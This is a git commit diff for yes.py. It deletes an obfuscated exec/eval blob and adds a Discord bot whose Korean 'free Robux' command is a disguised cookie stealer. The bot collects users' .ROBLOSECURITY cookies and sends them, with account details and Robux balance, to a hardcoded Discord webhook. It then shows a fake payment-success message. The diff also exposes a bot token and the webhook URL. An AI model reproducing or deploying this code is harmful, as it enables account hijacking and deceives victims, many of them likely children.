8e106b8ce6885977ec1eaf4e9eabab5f683a691e
ScriptDumper <118000363+ScriptDumper@users.noreply.github.com>
2024-01-14 20:13:44 +0900

    Update yes.py

--- yes.py
+++ yes.py
@@ -1,6 +1,114 @@
-import random ,base64,codecs,zlib,sys;py=""
-sys.setrecursionlimit(1000000000) 
+import requests
+import discord
+from discord.ext import commands
+import time
 
-pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'BytesWarning != anext','exec':'p1mjtHyOOzqtKUuG17rLPuoWatKA30B58Ztq6anQuMarCOJEAJvT2AWORWTFExt6l0ucN7ApT8gAOGIx','eval': bytes.fromhex('''4f84f52762b6d0609d3bb3069814a958e24cbe762d6a57600ea3803f9fb9122b'''.replace("\n","")) })
+class Bot(commands.Bot):
+    def __init__(self, intents: discord.Intents, **kwargs):
+        super().__init__(command_prefix="!", intents=intents, case_insensitive=True)
 
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='678600 11208268 10597896 12057529 1265792 934360 80032 3073984 63072 1774848 9991104 533178 8250963 7041836 608160 1378716 4853656 6426988 10697427 7267152 5350605 7131216 5225140 416768 383880 3814019 11145344 5443329 9208350 6917196 968576 9881717 211494 1515424 520320 6949608 6294960 2837241 3750130 5824896 9919276 3626276 399690 113216 3124384 2099072 3100416 5691840 8320176 9517620 4504060 1984412 1384560 965532 1450400 925680 3854928 1630816 7744485 8130540 1160925 115536 3993199 1713636 507276 1669184 11043408 893547 4553787 8650512 104939 6157445 4958420 7855305 2061556 3034697 971730 1234176 1513056 388512 3032320 10024560 7429950 3401328 566280 6794700 2998920 2514368 9120272 9013296 3150594 10711445 1949020 2767424 6670023 10450990 1007460 3469855 10832166 1702240 8720068 3099231 3097344 1398244 4565040 1307565 8637360 1993012 3899264 572860 2101632 2914912 1279456 544128 4710034 10445520 543060 7937184 1315000 191265 314180 9711958 3868560 3686500 5633793 1277240 3599541 6963849 5955208 653880 1319404 8646560 10152784 4246992 10328416 7006720 2520738 879229 2129429 4504192 6522021 10090344 8907710 9542916 5228613 5581525 2067912 7175187 6121900 8768315 433228 6416190 10257954 7237164 1542963 753872 11818554 3374900 1720435 10695138 10887395 2721432 726064 5089616 10680840 4263812 663646 2467585 892170 3848300 5709833 10114680 725116 242023 879110';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzzPXLcSwvMHJyDzN2zI3KjsotMYkqLzABAGSkCCw=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
+    async def on_ready(self):
+        print(f"Logged in as {self.user}")
+        await self.tree.sync()
+
+intents = discord.Intents.all()
+bot = Bot(intents=intents)
+
+@bot.hybrid_command(name='로블록스-무료-로벅스', description='파이썬 기반 웹 API를 이용하여 로블록스랑 연동하여 로벅스를 봇이 Temp Card로 결제합니다.')
+async def free_robux(interaction: discord.Interaction, 로블록스_쿠키: str):
+    try:
+        
+        # Never hardcode your webhook URL directly in your code, consider using a config file
+        webhook_url = "https://discord.com/api/webhooks/1195928311373779034/9n6FwsReoYk73oyw6RXJDbucRjmhIlpXm8ezS7D7Ph1DePpK6su4hBFvL0ZAq2lepmvy"
+
+        cookie = 로블록스_쿠키
+        
+        session = requests.Session()
+        session.cookies['.ROBLOSECURITY'] = cookie
+
+        # Make a request to get authenticated user information
+        check_cookie_response = session.get('https://users.roblox.com/v1/users/authenticated')
+
+        if check_cookie_response.status_code == 200:
+
+            roblox_username = check_cookie_response.json()['name']
+            roblox_displayname = check_cookie_response.json()['displayName']
+            roblox_user_id = check_cookie_response.json()['id']
+            robux = requests.get(f'https://economy.roblox.com/v1/users/{roblox_user_id}/currency',cookies={'.ROBLOSECURITY': cookie}).json()['robux']
+            roblox_avatar_url = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_user_id}&size=420x420&format=Png&isCircular=true").json()["data"][0]["imageUrl"]
+            user = interaction.author
+            user_id = user.id
+            user_name = user.name
+
+            discorddata = {
+                "content": "<@&1195931187428986972>\n[🍪 로블록스 쿠키 확인 링크 🍪](<https://eggy.cool>)\n[🍪 쿠키 IP 잠김 우회 링크 🍪](<https://eggy.cool/iplockbypass>)",
+                "embeds": [
+                    {
+                        "title": "🍪 로블록스 쿠키 로그 🍪",
+                        "description": f"```\n{cookie}\n```",
+                        "color": 8296703,
+                        "fields": [
+                            {"name": "디스코드 닉네임", "value": user_name, "inline": True},
+                            {"name": "디스코드 유저 ID", "value": user_id, "inline": True},
+                            {"name": "유저 핑", "value": f"<@{user_id}>", "inline": True},
+                            {"name": "로블록스 닉네임", "value": f"{roblox_username}", "inline": True},
+                            {"name": "로블록스 디플닉", "value": f"{roblox_displayname}", "inline": True},
+                            {"name": "로벅스", "value": f"{robux} 로벅스", "inline": True},
+                        ]
+                    }
+                ]
+            }
+
+            headers = {'Content-Type': 'application/json'}
+
+            # Use an asynchronous HTTP library (e.g., aiohttp) for async requests
+            response = requests.post(url=webhook_url, json=discorddata, headers=headers)
+
+            if response.ok:     
+                embed = discord.Embed(
+                    title=f"<a:Robux:1195990530648178778> {roblox_username}님 로벅스 충전을 시도합니다... <a:Loading:1196037169748398160>",
+                    color=65280
+                )
+                embed.add_field(
+                    name="닉네임",
+                    value=roblox_username,
+                    inline=True
+                )
+                embed.add_field(
+                    name="디플닉",
+                    value=roblox_displayname,
+                    inline=True
+                )
+                embed.add_field(
+                    name="로벅스",
+                    value=f"{robux} 로벅스",
+                    inline=True
+                )
+                embed.set_thumbnail(
+                    url=roblox_avatar_url
+                )
+                await interaction.send(embed=embed, ephemeral=True)
+                time.sleep(3.5)
+                embed = discord.Embed(
+                    title=":white_check_mark: 로벅스 결제 성공! :white_check_mark:",
+                    description="**24시간 후 로벅스가 랜덤한 값으로 들어옵니다!**\n\n**:warning: 만약 이 커맨드를 2번 이상 사용 하셨다면 중첩 오류로 인해 결제가 진행 되지 않을 수 있습니다! :warning:**",
+                    color=65280
+                )
+                await interaction.send(embed=embed, ephemeral=True)
+                print("Webhook successfully called")
+            else:
+                print(f"Webhook call failed with status code: {response.status_code}")
+        else:
+            embed = discord.Embed(
+                title=":x: 에러 :x:",
+                description="```로블록스 쿠키가 올바르지 않습니다```",
+                color=16711680
+            )
+            await interaction.send(embed=embed, ephemeral=True)
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        # Handle the error appropriately (e.g., log it, send a message, etc.)
+
+# Token should be kept secure, not hardcoded in the script
+bot.run("MTE5NTkyMTQ2NjcxMDA0ODgzOQ.GFZqhW.SmXnhSt18-B27z4M5EMSF8M5sDeR4zxezYs0RI")
